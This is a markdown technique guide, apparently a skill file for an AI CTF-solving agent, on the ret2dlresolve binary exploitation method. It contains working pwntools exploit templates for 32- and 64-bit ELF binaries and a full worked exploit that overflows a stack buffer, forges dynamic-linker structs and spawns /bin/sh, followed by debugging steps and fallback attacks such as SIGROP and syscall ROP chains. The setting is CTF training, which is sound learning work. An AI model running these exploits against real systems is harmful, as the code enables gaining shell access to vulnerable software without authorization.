# ret2dlresolve — resolving symbols without a libc leak

When you have a stack BOF but no way to leak libc (no `puts`/`write` GOT read
that you can trigger, no format-string info disclosure, no `/proc/self/maps`,
no attacker-controlled output buffer), don't give up and brute-force.
**ret2dlresolve** abuses the ELF dynamic linker's own lazy-resolution path:
`_dl_runtime_resolve` reads an index into `.rel.plt` / `.rela.plt`, walks
through `Elf{32,64}_Sym` and `.dynstr`, and patches the GOT with the resolved
address of whatever symbol name lives at that index. Forge the structs
`_dl_runtime_resolve` reads — point the name at `"system"`, say — and the
dynamic linker itself will resolve libc for you without you ever knowing where
libc lives. Pwntools' `Ret2dlresolvePayload` handles the ugly Elf-struct
bookkeeping. Works on 32 and 64-bit dynamically-linked ELF, as long as RELRO
isn't **Full** (`.dynstr` / `.rel.plt` must remain writable or reachable for
the forgery to survive). Not applicable to static PIE (no dynamic linker at
all).

## Layer 0 — Apply checklist

Shell-first discipline (Palisade arxiv 2412.02776): before you start crafting
a Ret2dlresolvePayload, rule out simpler paths.

```bash
file ./challenge/bin
checksec --file=./challenge/bin
strings ./challenge/bin | grep -iE 'flag|win|pwn|system|/bin/sh'
nm -D ./challenge/bin | grep -E ' (system|execve|execl|win|flag)'  # PLT entries?
objdump -R ./challenge/bin | head -30                              # relocations
```

**Reach for ret2dlresolve when ALL of these hold:**

- Binary is **dynamically linked** (`ldd ./chal` works; not `statically linked`,
  not `static-pie linked`). `file ./chal` should say
  `ELF ... dynamically linked, interpreter /lib/ld-*.so`.
- **No libc leak is available.** You've ruled out: PLT calls to `puts`/`write`
  you can trigger on a GOT entry; format-string leak; `/proc/self/maps` disclosure;
  attacker-echo buffer; stack uninit leak.
- **No `system` / `execve` / win function in the binary's PLT** — if `system@plt`
  exists, it's already dynamically-resolvable at a known address in a
  no-PIE binary; just `rop.call('system', [...])` directly. Check with
  `objdump -d -j .plt ./chal` or pwntools' `elf.plt`.
- You have **stack BOF / arbitrary stack control** (enough bytes to lay down a
  ROP chain that loads the fake struct addr + calls `_dl_runtime_resolve`).
- **RELRO is not Full.** `checksec` output:
  - `Full RELRO`  → blocked (`.dynstr` / `.got.plt` mapped read-only, linker
    won't revisit for lazy binding anyway).
  - `Partial RELRO` → works.
  - `No RELRO` → works.
- **NX is fine** — ret2dlresolve is pure ROP, no shellcode needed.
- Arch: 32-bit or 64-bit Linux/glibc. 32-bit is significantly easier; 64-bit
  works but has more alignment traps (see Layer 2).

**Skip ret2dlresolve and go elsewhere when:**

- Binary is **static-PIE** (`-static-pie`): no dynamic linker. Use direct
  `syscall` ROP chains (`mov rax, 59 ; syscall` for `execve`) or SIGROP.
- **Full RELRO**: go for leak-and-libc-brute (libc-database), SIGROP, or
  one-shot with a writable-buffer leak primitive.
- A `system@plt` / `execve@plt` entry already exists in the binary — simpler
  `rop.call('system', [bin_sh])` wins.

CTF frequency per the Hydra audit: **~15% of pwn challenges**, usually flagged
`HIGH` severity when they appear — solvers without this tool get stuck
brute-forcing a libc they can't identify.

## Layer 1 — 32-bit recipe

Pwntools' `Ret2dlresolvePayload` handles the Elf32_Rel + Elf32_Sym + STRTAB
forgery for you. The payload it returns is a blob of bytes containing the
three fake structs concatenated; the caller is responsible for writing that
blob to a known-address writable region (`.bss` is the typical pick) and
returning into `_dl_runtime_resolve` with the right reloc index on the stack.

**Minimal 32-bit template** (partial RELRO, stack BOF, no leak, NX on):

```python
from pwn import *

context.binary = elf = ELF('./chal')
# context.log_level = 'debug'     # uncomment when iterating

OFFSET = 44                        # distance from BOF to saved EIP (cyclic/pattern)

# Build fake Elf32_Rel + Elf32_Sym + "system\x00" in a blob; point `data_addr`
# at a writable region big enough to hold it. Default picks .bss.
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop = ROP(elf)
# Stage 1: read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
# Stage 2: return into the PLT0 stub with the forged reloc index on the stack
rop.ret2dlresolve(dlresolve)

payload = b'A' * OFFSET + rop.chain()

io = process(elf.path)
io.sendline(payload)                # overflow + first ROP
io.sendline(dlresolve.payload)      # feeds the fake Elf structs into .bss
io.interactive()                    # should drop you a shell
```

Pwntools does three things under the hood:

1. **Picks `data_addr`** — the writable region where the fake structs land.
   Default: a page-aligned spot in `.bss` (you can override with
   `Ret2dlresolvePayload(..., data_addr=...)`).
2. **Builds the forged blob** — `Elf32_Rel` at `data_addr + 0x0`,
   `Elf32_Sym` at `data_addr + 0x10`, and the name string (`"system\x00"`) at
   `data_addr + 0x20+`. Sym's `st_name` is computed so `.dynstr + st_name`
   lands on the fake name in the blob.
3. **Fakes `rop.ret2dlresolve(dlresolve)`** — this doesn't literally call
   `_dl_runtime_resolve`; it returns into **PLT0**
   (the common trampoline at the top of `.plt`) with `push <reloc_index>` on
   the stack, exactly as the lazy-binding stub would. PLT0 jumps into
   `_dl_runtime_resolve(link_map, reloc_index)`, which indexes **past the
   real `.rel.plt`** into your attacker-controlled `data_addr` — because
   `reloc_index` is chosen large enough that the resulting offset lands
   inside the fake Rel you planted.

If `.bss` is too small or already mapped read-only (rare on partial RELRO),
pass an explicit `data_addr` pointing at a leaked stack region, or at a
`.data` hole.

**Verification with gdb** (IAT pattern per arxiv 2409.16165 — see
`.claude/skills/meta/iat-pattern.md`):

```bash
gdb -q ./chal
(gdb) b *_dl_runtime_resolve     # or *_dl_runtime_resolve_xsavec
(gdb) r < /tmp/payload
# at the breakpoint, inspect the args on the stack:
(gdb) x/10wx $esp
# arg0 = link_map, arg1 = reloc_offset (should equal yours from pwntools log)
(gdb) x/10wx *(int*)($esp+4) + <your data_addr>   # walk the forged Elf32_Rel
```

If the reloc index is wrong, `_dl_runtime_resolve` reads garbage and the
process `SIGSEGV`s before `system` is called. Rebuild with
`context.log_level='debug'` and compare pwntools' computed offsets against the
binary's `.dynstr` / `.dynsym` ranges shown by `readelf -W -x .dynstr ./chal`.

## Layer 2 — 64-bit notes

Same idea, wider structs, more ways to trip:

- **Structs:** `Elf64_Rela` (24 bytes, adds an `r_addend`), `Elf64_Sym` (24
  bytes, different field order), `r_info` encoding uses a 32-bit-shifted
  symbol index (`ELF64_R_SYM(info) = info >> 32`). Pwntools' payload honors
  this; you only notice the difference if you're hand-rolling.
- **Alignment:** `Elf64_Sym` **must be 8-byte aligned**; if you pick a
  `data_addr` that isn't 8-aligned (or you overwrite partial bytes into it),
  `_dl_lookup_symbol_x` reads misaligned fields and usually crashes inside
  `strcmp` on a garbled `st_name`. Always round `data_addr` up to an 8-byte
  (ideally 16-byte) boundary.
- **Resolver variants:** modern glibc ships several resolvers depending on
  the host CPU's xsave support — `_dl_runtime_resolve`,
  `_dl_runtime_resolve_fxsave`, `_dl_runtime_resolve_xsave`,
  `_dl_runtime_resolve_xsavec`. PLT0 dispatches to whichever was chosen at
  load time. They differ in the prologue (they save xsave state before
  calling `_dl_fixup`) but the reloc-index reading is the same. Pwntools
  doesn't care which you're on; the IAT verification step
  (`x/20i _dl_runtime_resolve*`) does, because you want to breakpoint the
  right one.
- **Writable region picking:** `elf.bss()` is still the default. On 64-bit
  with PIE enabled, `.bss` address is PIE-relative — if you haven't leaked
  the PIE base, `Ret2dlresolvePayload` can't pick a fixed `data_addr`. Either:
  - disable PIE (if it's a `PIE: No PIE` binary per checksec — then `.bss`
    is a fixed address, go),
  - or leak PIE first via another primitive, then pass `data_addr` manually.
- **Stack alignment before `system`:** x86-64 SysV ABI requires
  `rsp % 16 == 0` at a `call`. glibc 2.34+'s `system` does a `movaps
  [rsp-0x88], xmm0` inside `do_system`, which `#GP`s on unaligned
  rsp. Insert a `ret` gadget before the `ret2dlresolve` stage to add 8 bytes
  of padding if your chain lands on 8-aligned rsp. Pwntools' `rop.ret2dlresolve`
  tries to do this automatically; if you hand-roll the chain, add
  `rop.raw(rop.find_gadget(['ret']).address)` before the dlresolve stage.
- **Larger reloc indices on 64-bit** — the reloc index you push must be the
  offset into `.rela.plt` in bytes, divided by `sizeof(Elf64_Rela)` (24). If
  pwntools produces a huge index, that's normal — it's chosen so that
  `jmprel + index * 24` lands on your forged `Elf64_Rela` at `data_addr`.

**Minimal 64-bit template:**

```python
from pwn import *
context.binary = elf = ELF('./chal64')

OFFSET = 72

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop = ROP(elf)
rop.raw(rop.find_gadget(['ret']).address)   # stack alignment fix-up (see above)
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

payload = b'A' * OFFSET + rop.chain()

io = process(elf.path)
io.sendline(payload)
io.sendline(dlresolve.payload)
io.interactive()
```

## Layer 3 — When it doesn't work

### Full RELRO

`checksec` shows `Full RELRO`. The linker resolved everything at load time
and mapped `.got.plt` / `.dynstr` read-only; `_dl_runtime_resolve` won't be
invoked again, and even if you reach it, writing to `link_map->l_addr`'d
strtab page will segfault. **Go with:**

- **libc-database brute** — if you can crash-and-retry, enumerate candidate
  libcs via known offsets. Ref: `niklasb/libc-database`.
- **SIGROP** (sigreturn-oriented programming) — if you have a `syscall`
  gadget (`int 0x80` on 32-bit, `syscall` on 64-bit) and write-to-stack,
  fake a full `struct sigframe` and invoke `rt_sigreturn` to set every
  register in one shot. Pwntools: `SigreturnFrame()`.
- **ret2csu** for arbitrary `rdx` control — helpful prelude if your
  eventual target is `execve` or you need to pass a third arg.

### Static PIE

`file ./chal` says `ELF ... static-pie linked`. There is no dynamic linker
mapped into the process at all — `_dl_runtime_resolve` doesn't exist. Your
options:

- **Direct `syscall` ROP** — find `syscall; ret`, `pop rax`, `pop rdi`,
  `pop rsi`, `pop rdx` gadgets; chain `execve("/bin/sh", 0, 0)` with
  `rax=59`.
- **SIGROP** — as above.
- **Known-offset libc-function call** — static-pie binaries statically
  embed libc, so symbols are at fixed offsets relative to the binary base.
  Leak the base via a partial pointer overwrite and compute.

### IFUNC / `.plt.sec` (glibc 2.33+)

Modern glibc uses **IFUNC** resolvers for performance-critical functions
(`memcpy`, `strlen`, etc.). These aren't resolved through the normal
`_dl_runtime_resolve` path — they go via `plt_init` calling an IFUNC
selector function. If you try to ret2dlresolve an IFUNC-backed symbol,
the linker attempts to call an "IFUNC resolver" at `sym.st_value + link_map->l_addr`
and crashes. **Don't target IFUNC symbols** — pick `system` (not IFUNC),
not `memcpy` (IFUNC on modern glibc).

Also: binaries built with `-fcf-protection` and recent gcc get a **`.plt.sec`**
section, which is a security-hardened PLT stub in front of the real `.plt`.
The lazy-resolution path still exists; pwntools' `Ret2dlresolvePayload`
handles `.plt.sec`-having binaries transparently as long as the ELF's
`.rel(a).plt` is present.

### No writable region at a known address

`.bss` is mapped but the address isn't known (PIE enabled, no PIE leak).
Options:

- Leak PIE base first (partial pointer, format-string, any disclosure
  primitive). Then pass `Ret2dlresolvePayload(elf, ..., data_addr=leaked_bss)`.
- If you have a **stack leak**, `data_addr` can point to the stack. The
  read chain then writes the fake structs to the stack region. Caveat: on
  64-bit the stack has NX; that's fine, we're not executing the structs,
  just reading them.

### Recent glibc changes (2.36+)

glibc 2.36 tightened the lazy-binding path: `_dl_fixup` now does a
`version_check` when the DT_VERSYM is present. On binaries compiled without
version definitions, this is a no-op; on binaries with a `.gnu.version_r`
section (common in distro-built binaries), the linker reads a version index
from your forged Rela's high bits and cross-references it against
`.gnu.version_r`. If that index is garbage (as it will be for your forged
Rela), you get an abort inside `match_symbol`. Pwntools' Ret2dlresolvePayload
attempts to set a plausible version index; on glibc 2.36+ partial-RELRO
binaries, if the payload fails, try `Ret2dlresolvePayload(..., resolution_addr=<something>)`
or fall back to libc-brute.

## Worked example (32-bit, partial RELRO, stdin BOF, no leak)

Target: `./chal` — 32-bit, dynamically linked, no PIE, partial RELRO, NX on,
no canary. `main()` does `read(0, buf, 0x100)` where `buf` is a 64-byte
local array. No `system@plt`, no win function, no libc provided.

**Reconnaissance:**

```bash
$ file ./chal
./chal: ELF 32-bit LSB executable, Intel 80386, ... dynamically linked,
interpreter /lib/ld-linux.so.2, ... not stripped

$ checksec --file=./chal
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
RUNPATH:  b'.'                   # important — if ./libc.so.6 exists, it'd be auto-used
Fortify:  No

$ nm -D ./chal | grep -E ' (system|execve|win)'
# nothing — no system@plt

$ objdump -d ./chal -j .plt | head
# shows only read@plt, write@plt, exit@plt — nothing we can shell with
```

Vuln-class matches: stack BOF, no leak, no win, partial RELRO, dynamically
linked → **ret2dlresolve**.

**Finding the offset:**

```python
from pwn import cyclic, cyclic_find, process

io = process('./chal')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.pc)       # EIP value at crash
print(f'offset = {offset}')         # e.g., 44
```

**Full exploit:**

```python
from pwn import *

context.binary = elf = ELF('./chal')
# context.log_level = 'debug'

OFFSET = 44                          # from cyclic_find above

# Step 1: fake-Elf-structs blob + target for the second read
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
# dlresolve.data_addr defaults to somewhere in .bss (known address on No-PIE binary)
# dlresolve.payload is the blob of bytes to send as stage-2 input

# Step 2: ROP chain — two stages
rop = ROP(elf)

#   Stage 1: read(0, data_addr, len(payload_blob))
#     This writes the forged Elf32_Rel + Elf32_Sym + "system\x00/bin/sh\x00"
#     into .bss at data_addr.
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

#   Stage 2: return into PLT0 with forged reloc_index
#     This invokes _dl_runtime_resolve(link_map, reloc_index), which walks
#     our forged Elf32_Rel at data_addr, looks up symbol "system" in the
#     (real) dynamic linker's hash table, and jumps into it with arg[0]
#     pointing at "/bin/sh".
rop.ret2dlresolve(dlresolve)

payload = b'A' * OFFSET + rop.chain()

# Step 3: fire
io = process(elf.path)
io.recvuntil(b'> ')                  # whatever prompt the binary prints
io.sendline(payload)                 # overflow + ROP
io.sendline(dlresolve.payload)       # feed fake Elf structs via the read() call
io.interactive()                     # drop to shell
# from here: `cat /flag*` → write to ./flag.txt → echo FLAG:
```

**Expected runtime trace:** BOF saves EIP → `read@plt` pulls the blob into
`.bss` at `data_addr` → `read` returns into **PLT0** with
`push <reloc_index>` on the stack → PLT0 jumps to `_dl_runtime_resolve`,
which indexes `jmprel + reloc_index` onto the forged `Elf32_Rel`, follows
its Sym → `st_name` → `"system\x00"` in the blob, resolves via the linker's
own hash table, and calls `system("/bin/sh")` with arg[0] from the stack.

**If it fails:** rerun with `context.log_level='debug'` (pwntools prints
chosen `data_addr` / `reloc_index`); breakpoint `*_dl_runtime_resolve` and
inspect memory at `data_addr` for alignment / corruption; double-check
`checksec` isn't lying about RELRO (`readelf -d ./chal | grep BIND_NOW`);
if `.bss` is tiny (<0x100), override with `data_addr=elf.bss()+0x200`.

## Common traps

- **Full RELRO** — `.dynstr` is read-only; attack is a non-starter. Re-check `checksec` before wasting time.
- **Stack alignment on 64-bit** — `system` calls `movaps [rsp-0x88], xmm0` on modern glibc, which `#GP`s on `rsp & 0xf != 0`. Insert a `ret` gadget for 8-byte adjustment.
- **IFUNC symbols** — `memcpy`/`strcmp`/`strlen` are IFUNCs on glibc 2.33+; the linker tries to call an IFUNC resolver and crashes. Pick `system` / `execve` / `puts` instead.
- **`.bss` size overflow** — blob is ~100 bytes for `system` with one arg, larger for `execve`. If `.bss` is smaller than the blob, override `data_addr` to a bigger writable region.
- **PIE without PIE leak** — `elf.bss()` is PIE-relative and meaningless without a base leak. Defeat PIE first.
- **Wrong resolver breakpoint** — on CPUs with xsavec, breakpoint `_dl_runtime_resolve_xsavec` (not `_dl_runtime_resolve`); check with `info address` first.
- **glibc 2.36+ version_check** — `.gnu.version_r` present → forged Rela's high bits treated as version index; linker aborts in `match_symbol`. Try pwntools' `versioned=True` kwarg or fall back to libc-brute.
- **Wrong sendline order** — send the ROP chain first (to trigger `read`), then the blob. Reversing them consumes the blob as stack input and segfaults.
- **`read` returns < len(blob)** — terminal / pty line-buffering can cut input short on newline bytes in the blob. Switch to raw `send` if the blob contains `0x0a`.
- **Unaligned `data_addr`** — must be 4-aligned (32-bit) or 8-aligned (64-bit) or pwntools' internal string-pointer arithmetic goes off-by-one and `/bin/sh` becomes `in/sh`.
- **Forked child** — if the BOF is in a `fork()`'d child, parent cleanup may eat stdout. Confirm with `strace -f`.

## Tools in Hydra image

- **pwntools** — main workhorse. `Ret2dlresolvePayload`, `ROP`, `ELF`,
  `process`/`remote`, `cyclic_find`. Docs:
  `https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html`.
- **ROPgadget** — find `ret`, `pop eax; ret`, `syscall; ret` gadgets for
  stack alignment and fallback chains.
  ```bash
  ROPgadget --binary ./chal --only "ret"
  ROPgadget --binary ./chal --ropchain
  ```
- **radare2** — inspect `.plt`, `.rel.plt`, `.dynsym`, `.dynstr`:
  ```bash
  r2 -AA ./chal
  [0x0]> iS~plt
  [0x0]> iI                        # RELRO / PIE / canary overview
  [0x0]> afl~plt.
  ```
- **gdb + pwndbg/GEF** — breakpoint `_dl_runtime_resolve*`, inspect the
  forged Elf structs, verify reloc index. Use the IAT pattern
  (`.claude/skills/meta/iat-pattern.md`) to drive gdb across turns via
  tmux (`.claude/skills/pwn/tmux-session.md`).
- **one_gadget** — fallback RCE once you have a libc leak; for
  ret2dlresolve-after-leak variants.
- **patchelf** — swap libc versions if a challenge provides `libc.so.6`
  that disagrees with system libc:
  ```bash
  patchelf --set-interpreter ./ld-*.so --set-rpath . ./chal
  ```
- **pwninit** — auto-patches binary + libc + ld so `./chal_patched` uses
  the provided libc. Useful even for ret2dlresolve when the challenge
  ships a specific glibc to make sure your local process runs the
  intended resolver variant.
- **readelf** — sanity-check the ELF's dynamic section:
  ```bash
  readelf -d ./chal                    # BIND_NOW would mean Full RELRO
  readelf -r ./chal                    # relocation entries
  readelf -W -x .dynstr ./chal         # string table; useful for sanity
  readelf -W --dyn-syms ./chal         # dynamic symbols
  ```
- **Ghidra (`analyzeHeadless`)** — for deeper structural analysis if the
  PLT/relocation layout is unusual (e.g., `.plt.sec`, statically-linked-ish
  binaries with partial dynamic sections). Not needed for vanilla BOF
  challenges.
- **objdump** — confirm PLT entries and relocations:
  ```bash
  objdump -d -j .plt ./chal
  objdump -R ./chal                    # dynamic relocations
  ```

## References

- **pwntools Ret2dlresolvePayload docs** —
  `https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html` — canonical
  API reference; copy its example first.
- **angelboy's "Return-to-dl-resolve"** (original writeup) —
  `https://gist.github.com/angelboy/6a59b3bc10d78b3e8fdc8c68f4c4b41b` — the
  paper that introduced the technique; explains the dynamic-linker internals.
- **ctf-wiki ret2dlresolve** —
  `https://ctf-wiki.mahaloz.re/pwn/linux/user-mode/mitigation/aslr/ret2dlresolve/`
  — Chinese-origin, translated; best end-to-end walkthrough of the Elf32_Rel
  / Elf32_Sym / STRTAB forgery.
- **ir0nstone Binary-Exploitation-Notes (ret2dlresolve chapter)** —
  `https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2dlresolve`
  — clean, code-focused.
- **ROP Emporium "ret2csu" and "callme"** —
  `https://ropemporium.com/challenge/ret2csu.html` — not ret2dlresolve per
  se, but the building-block challenges for fulfilling rdx control, which
  ret2dlresolve often needs to pair with on 64-bit.
- **Palisade** (arxiv 2412.02776) — shell-first reminder: check for
  `system@plt` / `win` before reaching for Ret2dlresolvePayload.
- **EnIGMA** (arxiv 2409.16165) — gdb IAT pattern for verifying resolver
  behavior across many breakpoint turns; pair with
  `.claude/skills/meta/iat-pattern.md`.
- **glibc source** — `https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c`
  — `_dl_fixup` is the function doing the work; read its source when
  forged structs trigger an assert you can't explain.

## Stop conditions

Pivot or give up when:

- After 30 minutes and three `data_addr` / `OFFSET` tweaks you still don't
  reach `_dl_runtime_resolve` — revisit the vuln-class hypothesis. Is
  there actually a stack BOF, or is this a format-string with no `%n`?
- `checksec` output re-read shows **Full RELRO** — pivot to libc-brute
  (libc-database), SIGROP, or win-function hunt.
- Binary is `static-pie` — pivot to direct-syscall ROP or SIGROP.
- glibc 2.36+ with `.gnu.version_r` and pwntools' payload aborts inside
  `match_symbol` — try the `versioned` kwarg (if your pwntools supports
  it), otherwise pivot to libc-brute.
- Symbol you need is an **IFUNC** (`memcpy`, `strlen`, etc.) — swap to a
  non-IFUNC symbol (`system`, `execve`, `puts`); if none are available,
  pivot.
- After two full exploit attempts plus one 64-bit alignment fix, the
  process still `SIGSEGV`s inside `_dl_runtime_resolve` — return to the
  triage agent with `./work/postmortem.md` summarizing: `checksec` output,
  chosen `data_addr`, reloc index pwntools computed, gdb breakpoint
  output on the resolver variant, and which ret2dlresolve variant
  (32 vs 64, xsavec vs fxsave) you tried.
